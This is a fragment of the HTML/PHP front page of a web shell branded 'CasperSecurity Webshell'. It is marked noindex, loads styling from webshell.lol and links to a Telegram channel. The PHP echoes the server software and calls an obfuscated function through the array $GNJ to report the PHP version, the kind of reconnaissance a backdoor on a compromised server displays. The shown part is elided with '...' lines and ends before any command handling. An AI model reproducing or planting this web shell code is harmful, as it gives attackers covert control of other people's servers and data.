	...
	<html dir="auto" lang="en-US">
		...
		<head>
			...
			<meta name="robots" content="NOINDEX, NOFOLLOW">
				...
				<title>CasperSecurity Webshell</title>

			<link rel="stylesheet" href="https://webshell.lol/main.css" type="text/css">
		...
		<body>
			<header>
				<div class="y x">
					<a class="ajx" href="https://t.me/caspersecurity">
						CasperSecurity Webshell
					</a>
				</div>
			...
			<article>
				<div class="i">
					...
					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>SOFT  :</b> <?php echo $_SERVER['SERVER_SOFTWARE'];?> <br><i class="far fa-lightbulb"></i><b>   PHP :</b> <?php echo $GNJ[1]();?><br>
					<i class="far fa-lightbulb"></i> &thinsp;&thinsp;<b>DAPA  :</b> <?php echo $content;?>
